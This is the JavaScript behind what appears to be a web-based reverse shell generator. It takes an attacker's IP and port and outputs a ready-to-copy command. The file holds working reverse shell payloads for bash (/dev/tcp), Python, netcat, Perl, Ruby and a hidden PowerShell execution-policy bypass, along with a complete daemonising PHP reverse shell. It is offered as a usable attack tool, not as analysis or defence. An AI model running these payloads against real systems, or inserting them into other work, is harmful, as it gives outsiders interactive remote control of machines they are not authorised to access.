document.getElementById('shell-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const ip = document.getElementById('ip').value;
    const port = document.getElementById('port').value;
    const language = document.getElementById('language').value;

    let command = '';

    switch (language) {
        case 'bash':
            command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            break;
        case 'python':
            command = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
            break;
        case 'php':
            command = `<?php set_time_limit(0); $VERSION = "1.0"; $ip = '${ip}'; $port = ${port}; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Can't fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Can't setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise. This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Can't spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { $input = fread($sock, $chunk_size); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { $input = fread($pipes[1], $chunk_size); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { $input = fread($pipes[2], $chunk_size); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit($string) { if (!$daemon) { print "$string"; } } ?>`;
            break;
        case 'nc':
            command = `nc -e /bin/sh ${ip} ${port}`;
            break;
        case 'perl':
            command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
            break;
        case 'ruby':
            command = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
            break;
        case 'powershell':
            command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            break;
        default:
            command = 'Unsupported language';
    }

    document.getElementById('output-command').textContent = command;
});
document.getElementById('copy-button').addEventListener('click', function () {
    const command = document.getElementById('output-command').textContent;

    // Copy the command to the clipboard
    navigator.clipboard.writeText(command)
        .then(() => {
            // Change button text to indicate success
            const copyButton = document.getElementById('copy-button');
            copyButton.innerHTML = '<i class="fa fa-check"></i> Copied!';
            copyButton.style.backgroundColor = 'var(--color-green)';

            // Reset the button after 2 seconds
            setTimeout(() => {
                copyButton.innerHTML = '<i class="fa fa-copy"></i> Copy to Clipboard';
                copyButton.style.backgroundColor = 'var(--color-main)';
            }, 2000);
        })
        .catch((err) => {
            console.error('Failed to copy: ', err);
            alert('Failed to copy command to clipboard.');
        });
});
